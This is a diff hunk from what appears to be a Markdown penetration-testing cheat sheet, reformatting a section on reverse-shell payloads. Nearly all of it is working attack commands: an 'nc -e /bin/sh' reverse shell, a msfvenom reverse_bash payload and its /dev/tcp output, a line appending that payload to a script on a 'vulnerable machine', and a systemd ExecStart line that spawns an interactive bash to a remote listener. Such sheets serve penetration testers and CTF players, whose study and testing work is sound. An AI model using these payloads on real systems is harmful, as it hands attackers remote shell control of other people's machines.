@@ -140,8 +140,11 @@ nc -e /bin/sh 192.168.x.x 4444
 ```
 ### Reverse Bash RAW for message redirecting
 ``` msfvenom -p cmd/unix/reverse_bash lhost=192.168.2.0 lport=4444 R```
+
 ```OUTPUT = echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60"```
-```Redirect this to message service on vulnerable machine e.g: echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_machine.sh```
+
+```Redirect this to message service on vulnerable machine e.g: 
+echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_machine.sh```
 
 ### ExecStart exploit
 ``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
